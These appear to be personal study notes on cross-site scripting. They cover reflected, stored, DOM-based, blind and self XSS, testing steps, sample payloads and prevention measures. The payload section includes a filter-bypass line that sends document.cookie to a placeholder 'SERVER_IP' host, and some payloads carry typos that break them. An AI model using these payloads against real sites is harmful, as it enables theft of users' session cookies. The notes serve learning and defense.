# XSS Overview

Cross-Site Scripting is an injection attack where malicious code (*JavaScript*, *HTML*, *etc.*) gets injected into a web application with the intention of being executed by other users

* If an application fails to distinguish between user input and the legitimate code that makes up a web page, attackers can inject their own code into pages viewed by others (*Comment sections*, *etc.*)
* Attackers can have the victim's browser execute malicious script or code to do certain actions (*Steal cookies*, *Leak personal information*, *etc.*)

![](https://github.com/JonmarCorpuz/SecondBrain/blob/main/Assets/Whitespace.png)

# Types of XSS

| XSS Type | Description |
| --- | --- |
| Reflected XSS | |
| Stored XSS | |
| DOM-Based XSS | |
| Blind XSS | |

## Reflected XSS

Reflected XSS occurs when an attacker injects malicious scripts into a web application that are immediately reflected back to a user without proper validation or sanitization

![](https://github.com/JonmarCorpuz/SecondBrain/blob/main/Assets/8e3bffe500771c03366de569c3565058.png)

* Relies on tricking a user into clicking a specially crafted link or submitting a malicious form, which then executes the malicious script in their browser
* In this case, the application takes in user input, processes it server-side, and immediately returns it to the user
* Often happens when the server relies on user input to construct pages that display search results or error messages (*Search bars*, *etc.*)
* Enables attackers to execute code on the browsers of victims who click their malicious links
* Reflected XSS payloads get sent to the server and returned to the user's browser within an HTTP response

| Reflected XSS Method | Description |
| --- | --- |
| Parameters in the URL Query String | |
| URL File Path | |
| HTTP Headers | |

## Stored XSS

Stored XSS is when a malicious script that was injected by an attacker is permanently stored on the target web server (Ex: *Database*, *Message forum*, *Comment section*, *etc.*)

![](https://github.com/JonmarCorpuz/SecondBrain/blob/main/Assets/cc2566d297f7328d91bc8552f902210e.png)

* When other users view the affected content, the malicious script is served and executed in their browser
* All the user has to do to become a victim is to view a page with the payload embedded (Whereas reflected and DOM XSS usually require the user to click a malicious link)
* Everytime users access the stored information, the XSS executes in their browser

## DOM-Based XSS

DOM-Based XSS occurs when the client-side script of a web application manipulates the Document Object Model in an unsafe way based on user input (The DOM is a model that represents a web page's structure and used to render a web page by defining the basic properties and behavior of each HTML element)

* Targets the DOM directly by attacking the client's local copy of the web page instead of going through the server (Attackers can attack the DOM when a page takes user-supplied data and dynamically alters the DOM based on that input)
* Doesn't require server involvement because it executes when user input modifies the source code of the page in the browser directly (The XSS script is never sent to the server, so the HTTP response from the server won't change)
* User input never leaves the user's browser
* The application takes in user input, processes it on the victim's browser, and then returns it to the user (The XSS payload is injected onto a page because of client-side code rendering user input in an insecure manner)

## Blind XSS

Blind XSS is when a threat actor injects malicious scripts into a web application without immediately seeing the results

* Useful when the injected script is stored and later executed in a different context or viewed by a subject that has access to a part of the application that the attacker can't directly see  (Ex: *An attacker can submit a message with JavaScript code and have that code executed by any admin who views that message*)

## Self-XSS

Self-XSS is where an attack tricks vicitms to input a malicious payload themselves 

![](https://github.com/JonmarCorpuz/SecondBrain/blob/main/Assets/Whitespace.png)

# Finding a XSS Vulnerability

1. Look for user input opportunities on the target application
    * If user input is stored and used to construct a web page later, test the input field for stored XSS
    * If user input in a URL gets reflected back on the resulting web page, test for reflected and DOM XSS
2. Insert XSS payloads into the user input fields you've found
3. Confirm the impact of the payload by checking if your browser runs your JavaScript code or generates a request to your server
4. Consider it's impact
5. Report it

![](https://github.com/JonmarCorpuz/SecondBrain/blob/main/Assets/Whitespace.png)

# XSS Payloads

```HTML
<img onload=alert('XSS') scr="example.png">
```

URL
```Text
javascript:alert('XSS')
```

Data URL
```Text
data:text/html;base64,<ENCODED_STRING>
```

iFrame (Useful when <script> tags are banned by the XSS filter)
```HTML
<iframe src=javascript:alert('XSS')>
```

Make the victim's browser request a page on your server
```JavaScript
<script src='http://SERVER_IP/test'></script>
```

Insert JavaScript code into HTML code as an attribute to the current tag
```HTML
<img src="example.com" onerror="alert('XSS');">
```
```HTML
<a href="javascript:alert('XSS')>Click me</a>"
```

Use the JavaScript `fromCharCode()` function to construct an XSS payload without quotes
```JavaScript
String,fromCharCode()
```

tmp
```JavaScript
<script<script>t>location='http://SERVER_IP/c='document.cookie;</scrip</script>t>
```

![](https://github.com/JonmarCorpuz/SecondBrain/blob/main/Assets/Whitespace.png)

# XSS Polygot

An XSS polygot is a type of XSS payload that executes in multiple contextx (Ex: *It'll execute regardless of whether it is inserted into an <img> tag, <script> tag, or a <p> tag*)

![](https://github.com/JonmarCorpuz/SecondBrain/blob/main/Assets/Whitespace.png)

# Preventing XSS

* Robust input validation
* Contextual output escaping (Escaping ensures that browsers don't misinterpret characters as code to execute)
* Contextual output encoding
* Applications should never insert user-submitted data directly into an HTML document
* Applications should avoid code that rewrites the HTML document based on user input
* Applications should implement client-side input validation before it's inserted into the DOM
* You can instruct the browser to execute only scripts from a list of source
